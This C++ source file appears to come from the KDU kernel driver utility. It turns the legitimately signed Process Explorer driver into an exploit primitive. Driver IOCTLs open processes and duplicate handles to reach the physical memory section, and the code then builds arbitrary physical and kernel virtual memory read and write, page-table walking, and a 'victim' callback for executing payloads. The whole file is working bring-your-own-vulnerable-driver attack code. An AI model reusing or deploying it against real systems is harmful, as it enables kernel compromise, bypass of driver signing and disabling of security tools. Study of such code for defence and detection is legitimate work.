/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       PROCEXP.CPP
*
*  VERSION:     1.40
*
*  DATE:        20 Oct 2023
*
*  Process Explorer driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/procexp.h"

HANDLE g_PexPhysicalMemorySection = NULL;

static KDU_VICTIM_PROVIDER g_ProcExpVictimSelf{
        (LPCWSTR)PROCEXP152,              // Device and driver name
        (LPCWSTR)PROCEXP1627_DESC,        // Description
        IDR_PROCEXP1627,                  // Resource id in drivers database
        KDU_VICTIM_PE1627,                // Victim id
        SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,     // Desired access flags used for acquiring victim handle
        KDU_VICTIM_FLAGS_NONE,            // Victim flags, target dependent
        VpCreateFromExistingCallback,     // Victim create callback
        VpReleaseCallbackStub,            // Victim release callback
        VpExecuteFromExistingCallback,    // Victim execute payload callback
        &g_ProcExpSig,                    // Victim dispatch bytes
        sizeof(g_ProcExpSig)              // Victim dispatch bytes size
};

#define PexpMapMemory(PhysicalAddress, NumberOfBytes, MapForWrite) \
    supMapPhysicalMemory(g_PexPhysicalMemorySection, PhysicalAddress, NumberOfBytes, MapForWrite)

#define PexpUnmapMemory(BaseAddress) supUnmapPhysicalMemory(BaseAddress)

/*
* PexpReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI PexpReadWritePhysicalMemory(
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    return supReadWritePhysicalMemory(g_PexPhysicalMemorySection,
        PhysicalAddress,
        Buffer,
        NumberOfBytes,
        DoWrite);
}

/*
* PexReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI PexReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return PexpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        FALSE);
}

/*
* PexWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI PexWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return PexpReadWritePhysicalMemory(PhysicalAddress,
        Buffer,
        NumberOfBytes,
        TRUE);
}

/*
* PexQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI PexQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
    ULONG cbRead = 0x100000;

    UNREFERENCED_PARAMETER(DeviceHandle);

    *Value = 0;

    SetLastError(ERROR_SUCCESS);

    pbLowStub1M = (ULONG_PTR)PexpMapMemory(0ULL,
        cbRead,
        FALSE);

    if (pbLowStub1M) {

        PML4 = supGetPML4FromLowStub1M(pbLowStub1M);
        if (PML4)
            *Value = PML4;

        PexpUnmapMemory((PVOID)pbLowStub1M);

    }

    return (PML4 != 0);
}

/*
* PexVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI PexVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        PexQueryPML4Value,
        PexReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* PexReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI PexReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = PexVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PexpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            FALSE);

    }

    return bResult;
}

/*
* PexWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI PexWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    UNREFERENCED_PARAMETER(DeviceHandle);
    SetLastError(ERROR_SUCCESS);

    bResult = PexVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = PexpReadWritePhysicalMemory(physicalAddress,
            Buffer,
            NumberOfBytes,
            TRUE);

    }

    return bResult;
}

/*
* PexpDuplicateHandle
*
* Purpose:
*
* Duplicate handle via ProcExp driver request.
*
*/
BOOL PexpDuplicateHandle(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE SourceProcessId,
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
)
{
    PEXP_DUPLICATE_HANDLE_REQUEST request;

    UNREFERENCED_PARAMETER(SourceProcessHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(HandleAttributes);
    UNREFERENCED_PARAMETER(Options);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.UniqueProcessId = SourceProcessId;
    request.SourceHandle = SourceHandle;

    *TargetHandle = NULL;

    return supCallDriver(DeviceHandle,
        IOCTL_PROCEXP_DUPLICATE_HANDLE,
        &request,
        sizeof(request),
        TargetHandle,
        sizeof(PVOID));
}

/*
* PexOpenProcess
*
* Purpose:
*
* Open process handle via ProcExp driver request.
*
*/
BOOL WINAPI PexOpenProcess(
    _In_ HANDLE DeviceHandle,
    _In_ HANDLE ProcessId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE ProcessHandle
)
{
    UNREFERENCED_PARAMETER(DesiredAccess);

    *ProcessHandle = NULL;

    return supCallDriver(
        DeviceHandle,
        IOCTL_PROCEXP_OPEN_PROCESS,
        (PVOID)&ProcessId,
        sizeof(ProcessId),
        ProcessHandle,
        sizeof(PVOID));
}

/*
* PexRegisterDriver
*
* Purpose:
*
* Driver initialization routine.
*
*/
BOOL WINAPI PexRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    KDU_CONTEXT* context = (KDU_CONTEXT*)Param;

    if (context == NULL)
        return FALSE;

    context->Victim = &g_ProcExpVictimSelf;

    return supOpenPhysicalMemory(DeviceHandle,
        PexOpenProcess,
        PexpDuplicateHandle,
        &g_PexPhysicalMemorySection);
}

/*
* PexpUnregisterDriver
*
* Purpose:
*
* Free ProcExp driver related resources.
*
*/
BOOL WINAPI PexpUnregisterDriver(
    _In_ HANDLE DeviceHandle)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    if (g_PexPhysicalMemorySection) {
        NtClose(g_PexPhysicalMemorySection);
        g_PexPhysicalMemorySection = NULL;
    }

    return TRUE;
}
